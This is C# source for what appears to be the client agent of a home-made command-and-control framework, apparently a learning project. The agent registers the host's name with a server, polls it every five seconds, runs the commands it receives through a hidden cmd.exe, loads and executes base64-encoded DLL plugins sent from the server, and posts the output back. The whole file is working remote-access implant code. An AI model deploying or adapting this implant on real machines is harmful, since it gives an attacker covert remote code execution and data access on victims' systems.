﻿using System;
using System.Collections.Generic;
// per https://learn.microsoft.com/en-us/dotnet/csharp/tutorials/console-webapiclient
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime;
using System.IO;
using System.Text;
using System.Web;

// testing running cmd
using System.Diagnostics;

namespace client
{
    public class Client
    {   
        
        // tasks enables threading for now
        static async Task Main(string[] args)
        {
            //takes command line args of IP and Port
            int tport;
            string tipaddress;

            try {
                tport = Int32.Parse(args[1]);
                tipaddress = args[0];
                //Listener test = new Listener(args[0], tport, args[2]);
            } catch (System.IndexOutOfRangeException) {
                tport = 1234;
                tipaddress = "127.0.0.1";
                
                Console.WriteLine("No arguments provided, using defaults...");
            }

            Communicator comm = new Communicator(tipaddress, tport);
            //await Communicator.GetRequest(comm.host);
            await comm.RegisterAgent();

            // test command exeuction
            // this is a bit janky
            //System.Diagnostics.Process.Start("cmd.exe", "/c whoami");

            // run getcommand every 5 seconds
            int AgentCheckInterval = 5000;
            while (true) {
                if(comm.errored){
                    Console.WriteLine("Error in communication, exiting");
                    break;
                }
                await comm.GetCommand();
                await Task.Delay(AgentCheckInterval);
            }
        }
    }

    // class to chat with server with
    public class Communicator 
    {

        // declare http client 
        private static readonly HttpClient httpclient = new HttpClient();

        public string host {get; set;}
        public int port {get; set;}
        public Uri uri {get; set;}
        public bool errored {get; set;}
        public Communicator(string host, int port)
        {
            this.host = host;
            this.port = port;

            // build uri
            Uri uri = new Uri($"http://{this.host}:{this.port}");
            this.uri = uri;

            this.errored = false;
        }

        public static async Task GetRequest(string url)
        {
            // debug right now, just dumps response to console
            // per https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient.getasync?view=netcore-3.1
            // per https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpresponsemessage?view=netcore-3.1
            HttpResponseMessage response = await httpclient.GetAsync(url);
            response.EnsureSuccessStatusCode();
            string responseBody = await response.Content.ReadAsStringAsync();
            Console.WriteLine(responseBody);
        }

        // register agent with server
        public async Task RegisterAgent()
        {

            // get machine hostname
            string hostname = System.Environment.MachineName;
            // build httpcontent body with hostname
            string contentBody = $"{{\"hostname\": \"{hostname}\",\"register\": \"true\"}}";
            HttpContent content = new StringContent(contentBody);
            (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
            if (sent) {
                Console.WriteLine("Agent registered with server.");
            } else {
                Console.WriteLine("Agent failed to register with server.");
                this.errored = true;
            }

        }

        public async Task GetCommand()
        {
            // get commands from server
            // by commands I mean json from server on what to do

             // get machine hostname
            string hostname = System.Environment.MachineName;
            // build httpcontent body with hostname
            string contentBody = $"{{\"hostname\": \"{hostname}\",\"command\": \"true\"}}";
            HttpContent content = new StringContent(contentBody);
            (bool sent, string body) = await this.BuildAndSendHTTPRequest(content);
            if (sent) {
                Console.WriteLine("Agent recieved new command set.");

                // parse body json into a object
                // c# got mad when there was no class to pass this into
                // i now realize i could have used a base class lol
                CommandSet commandSet = System.Text.Json.JsonSerializer.Deserialize<CommandSet>(body);
                
                // console log the command set for testing
                //Console.WriteLine($"Command set recieved: {commandSet.commands}");

                // execute commands
                
                // don't pass another shell to this command shell!!!
                foreach(string[] command in commandSet.commands){
                    string result;
                    if (command[1] == "console"){
                        result = await ConsoleCommand(command[0]);
                    } else if (command[1] == "plugin") {
                        result = await PluginCommand(command[0]);
                    } else {
                        result = "Failed";
                    }
                    string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
                    (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
                }
            } else {
                Console.WriteLine("Agent failed to fetch commands.");
            }
            
        }

        private async Task<string> PluginCommand(string command){
            //saves a file transfered from the server
            //should take real commands to run with real plugins
            //that are loaded with assembly from a dll
            Assembly asm = Assembly.Load(Base64DecodeFile(command));
            /*
            * this should search through all classes to find the Main or other starting method
            */
            foreach(Type oType in asm.GetTypes()){
                try{
                    dynamic c = Activator.CreateInstance(oType);
                    var methods = oType.GetMethods();
                    var method = oType.GetMethod("PluginMain");
                    method.Invoke(c, null);
                } catch {
                    Console.WriteLine("cannot find Main method");
                }
            }
            //File.WriteAllBytes("./file", Base64DecodeFile(command));
            return "did it";
        }

        private Byte[] Base64DecodeFile(string file){
            return Convert.FromBase64String(file);
        }

        private async Task<string> ConsoleCommand(string command){
            //method to run a consolecommand and return it's result
            Console.WriteLine($"Executing command: {command}");
            // execute command
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = $"/c {command}";
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.CreateNoWindow = true;
                    using (Process process = Process.Start(startInfo))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string result = await reader.ReadToEndAsync();
                            result = HttpUtility.UrlEncode(result);
                            Console.WriteLine(result);
                            return result;
                        }
                    }
        }

        public async Task<(bool,string)> BuildAndSendHTTPRequest(HttpContent content)
        {
            try{
                // send to server for registration
                HttpResponseMessage response = await httpclient.PostAsync(this.uri, content);
                response.EnsureSuccessStatusCode();

                //Console.WriteLine(await response.Content.ReadAsStringAsync());
                string body = await response.Content.ReadAsStringAsync();
                return (true, body);
            }
            catch (HttpRequestException e)
            {
                //Console.WriteLine("\nException Caught!");
                //Console.WriteLine("Message :{0} ",e.Message);

                return (false, "");
            }
        }
        
    }

    // class to hold command set
    public class CommandSet
    {
        public LinkedList<String[]> commands {get; set;}
    }

}
